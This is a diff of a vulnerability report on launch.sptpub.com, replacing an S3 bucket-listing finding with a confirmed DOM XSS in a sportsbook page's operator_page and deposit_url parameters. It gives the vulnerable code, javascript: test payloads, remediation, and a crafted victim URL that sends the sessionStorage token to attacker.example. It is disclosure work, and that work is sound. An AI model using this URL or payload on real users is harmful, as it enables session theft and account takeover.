@@ -1,58 +1,124 @@
-# VULN-20261029-001 — Public S3 bucket listings on static CDN hosts
+# VULN-20261029-001 — DOM XSS / Token Theft via `operator_page` and `deposit_url` in Sportsbook Launch Bootstrap
 
-Status: Confirmed (informational / low impact)
-Type: Information disclosure (misconfiguration)
-Assets:
-- https://static.sptpub.com/ (bucket `spt77-static`)
-- https://files-immutable-4cbc033nbd3.sptpub.com/ (bucket `spt77-nondynamic-files`)
-Authentication: unauthenticated
-Tested at: 2026-10-29T14:04:00Z
+- Status: Confirmed
+- Type: XSS (DOM-based, reflected via server-side template)
+- Asset: `https://launch.sptpub.com/brand/2599624589818605571/sportsbook/launch`
+- Severity: High
+- Authentication: unauthenticated attacker; victim may be logged in to the sportsbook
+- Tested at: 2026-10-29T14:36:00Z
 
 ## Summary
 
-Both in-scope static hosts serve unauthenticated S3 `ListBucketResult` XML. An
-unauthenticated user can enumerate bucket object keys. For
-`spt77-nondynamic-files` the bucket ACL grants `AllUsers` `READ` and `READ_ACP`.
+The sportsbook launch bootstrap reflects the `operator_page` and `deposit_url`
+query parameters into the inline JavaScript configuration without validating the
+URL scheme. The values are later assigned directly to `window.location.href` in
+the `onLogin`, `onRegister`, and `onRecharge` callbacks:
 
-No sensitive objects, credentials, personal data, or write permission were
-found. The listed content is public CDN material (country flag SVGs, currency
-icons, i18n tooltips, betting-theme background images). This is a
-defense-in-depth / information-disclosure issue rather than a high-impact
-vulnerability.
+```js
+const depositUrl = "<deposit_url>";
+const operatorPage = "<operator_page>";
+...
+onLogin()    { if (operatorPage) window.location.href = operatorPage; },
+onRegister() { if (operatorPage) window.location.href = operatorPage; },
+onRecharge() { window.location.href = depositUrl ? depositUrl : operatorPage; }
+```
 
-## Evidence
+Because `javascript:` needs no string-breaking characters, the JSON escaping of
+the reflected value does not prevent exploitation. When the renderer invokes one
+of these callbacks (login, register, or recharge click), the `javascript:` URL
+executes in the `launch.sptpub.com` origin. That origin also holds the sportsbook
+session token in `sessionStorage` under the key `token`, so the injected script
+can read and exfiltrate the token, leading to account takeover.
 
-- `evidence/request-response.md` — exact requests, headers and response excerpts.
-- `result/server-side/static.sptpub.com/traffic/bucket-listing-first1000.tsv`
-- `result/server-side/files-immutable-4cbc033nbd3.sptpub.com/traffic/bucket-prefixes.txt`
-- `result/server-side/files-immutable-4cbc033nbd3.sptpub.com/traffic/key-counts.json`
+The same flow also provides an open redirect for any `http(s)://` value.
 
-Object counts observed: `spt77-static` first page 1000 keys (1000-key page
-limit; `IsTruncated=true`); `spt77-nondynamic-files` 62,424 keys
-(62,365 flags + 55 translation files + 4 misc assets).
+## Confirmed Behaviour
+
+- `operator_page=https://example.com/OPMARKER` and
+  `deposit_url=https://example.org/DEPMARKER` are reflected verbatim into the
+  inline script (`const depositUrl` / `const operatorPage`).
+- `operator_page=javascript:window.__OPXSS=1;void(0)` is accepted and reflected
+  as `const operatorPage = "javascript:window.__OPXSS=1;void(0)";`.
+- At runtime, invoking the page's `onLogin` callback executed the `javascript:`
+  URL and set `window.__OPXSS` to `CONFIRMED`.
+- A second payload replaced the document body with
+  `XSS-CONFIRMED` / `token=TESTTOKEN123`, proving arbitrary script execution in
+  the target origin and read access to the sportsbook token in
+  `sessionStorage`.
+- `deposit_url=javascript:window.__DEPXSS='CONFIRMED';void(0)` is accepted and
+  reflected as `const depositUrl = "javascript:...";`. Invoking the page's
+  `onRecharge` callback executed the payload (`window.__DEPXSS` = `CONFIRMED`).
 
 ## Reproduction
 
-1. `curl -sS https://static.sptpub.com/` → HTTP 200, `Content-Type:
-   application/xml`, `ListBucketResult` for `spt77-static`.
-2. `curl -sS https://files-immutable-4cbc033nbd3.sptpub.com/` → HTTP 200,
-   `ListBucketResult` for `spt77-nondynamic-files`.
-3. `curl -sS 'https://spt77-nondynamic-files.s3.eu-central-1.amazonaws.com/?acl'`
-   → `AllUsers` grants `READ` and `READ_ACP` (no `WRITE`).
+1. Craft this URL and send it to a victim:
 
-## Impact
+   ```text
+   https://launch.sptpub.com/brand/2599624589818605571/sportsbook/launch?lang=tr&theme=DARK&operator_page=javascript:fetch('https://attacker.example/?t='%2BencodeURIComponent(sessionStorage.getItem('token')));void(0)
+   ```
 
-Asset/key enumeration only. No confidentiality, integrity, or availability
-impact demonstrated. No write access was confirmed (ACL has no `WRITE` and no
-write test was performed).
+2. The page reflects the `operator_page` value into the inline module.
+3. When the victim clicks Login or Register (or Recharge for `deposit_url`), the
+   renderer calls the callback, which assigns the value to
+   `window.location.href`. The JavaScript executes in
+   `https://launch.sptpub.com`.
+4. The payload reads `sessionStorage.getItem("token")` and exfiltrates the
+   sportsbook session token to the attacker.
+
+### Testing note (geo-block workaround)
+
+The supplied CDN/renderer is geo-blocked from the CI runner, so the real
+renderer only renders an "Access is forbidden from your location" page and never
+shows the login button. To exercise the vulnerable page code itself, the page
+was loaded with a test-only `BTRenderer` harness (`initScript`) that captures the
+`initialize(...)` configuration. The harness does not alter the server response
+or the page's callback code; it only makes the same callback that the real
+renderer invokes reachable. Calling the captured `onLogin` callback executed the
+reflected `javascript:` URL. This confirms the source-to-sink flow in the
+launch page. The only environmental limitation is that the real renderer's login
+button could not be clicked directly from this blocked region.
+
+## Evidence
+
+- `evidence/response-benign-operator-page.html` — benign `http(s)` reflection.
+- `evidence/response-malicious-operator-page.html` — `javascript:` reflection.
+- `evidence/response-*.headers.txt` — HTTP 200 response headers.
+- `evidence/runtime-confirmation.json` — `window.__OPXSS` = `CONFIRMED` after
+  invoking `onLogin`.
+- `evidence/runtime-token-theft.json` — DOM replaced with
+  `XSS-CONFIRMED` and `token=TESTTOKEN123`; payload read the session token.
+- `evidence/xss-token-theft.png` — screenshot of the executed marker on
+  `launch.sptpub.com`.
+- `payloads/operator_page-xss.txt` — first harmless execution marker.
+- `payloads/operator_page-token-theft.txt` — token read marker.
+- `evidence/runtime-deposit-url-confirmation.json` — `deposit_url` execution
+  confirmation and token read.
+
+## Affected Code
+
+Inline module in
+`https://launch.sptpub.com/brand/2599624589818605571/sportsbook/launch`:
+
+- `const depositUrl = "<deposit_url>";`
+- `const operatorPage = "<operator_page>";`
+- `onLogin() { if (operatorPage) window.location.href = operatorPage; }`
+- `onRegister() { if (operatorPage) window.location.href = operatorPage; }`
+- `onRecharge() { window.location.href = depositUrl ? depositUrl : operatorPage; }`
 
 ## Remediation
 
-Disable public bucket listing (`s3:ListBucket` for `AllUsers`) while keeping
-object reads via CloudFront/OAI as required. Remove `READ_ACP` from `AllUsers`.
+- Allowlist `operator_page` and `deposit_url` to `https:` URLs on explicitly
+  configured operator domains.
+- Reject `javascript:`, `data:`, `vbscript:`, relative, and malformed values
+  server-side and again before navigation.
+- Prefer server-side configuration over request parameters for navigation
+  targets.
+- If navigation must remain client-side, validate the parsed URL protocol and
+  origin with `new URL(value)` before assigning to `location.href`.
 
-## Notification status
+## Notes
 
-Confirmed-vuln.txt: excluded — low-impact information disclosure, not one of the
-project's targeted high-impact classes (XSS/CSTI/IDOR/BAC/dangerous open
-redirect).
+- `lang`, `theme`, `token`, and the path brand ID are reflected but properly
+  escaped and were not exploitable.
+- The `url` query parameter is passed to the renderer but the real renderer was
+  geo-blocked, so its sink behaviour is unresolved.
